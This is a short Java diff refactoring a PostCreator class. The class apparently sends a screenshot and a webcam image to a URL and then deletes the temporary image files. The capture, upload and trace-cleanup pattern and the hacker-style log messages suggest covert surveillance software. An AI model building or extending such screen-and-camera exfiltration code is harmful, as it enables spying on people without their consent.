@@ -13,14 +13,12 @@ import org.apache.http.impl.client.CloseableHttpClient;
 
 public class PostCreator {
 	private String url;
-	private String screen_img;
-	private String camera_img;
+	private String screen_img = "./tempscreenshot.png";
+	private String camera_img = "./tempcamerashot.png";
 
-	public PostCreator(String url, String screen_img, String camera_img) {
+	public PostCreator(String url) {
 		System.out.println("[*] Loading variables");
 		this.url = url;
-		this.screen_img = screen_img;
-		this.camera_img = camera_img;
 	}
 
 	public void send() {
@@ -54,8 +52,8 @@ public class PostCreator {
 
 	public void cleanup() {
 		try {
-			Files.delete(FileSystems.getDefault().getPath("./tempscreenshot.png"));
-			Files.delete(FileSystems.getDefault().getPath("./tempcamerashot.png"));
+			Files.delete(FileSystems.getDefault().getPath(this.screen_img));
+			Files.delete(FileSystems.getDefault().getPath(this.camera_img));
 		} catch (Exception e) {
 			System.out.println("[-] Failed to delete temporary files");
 		}
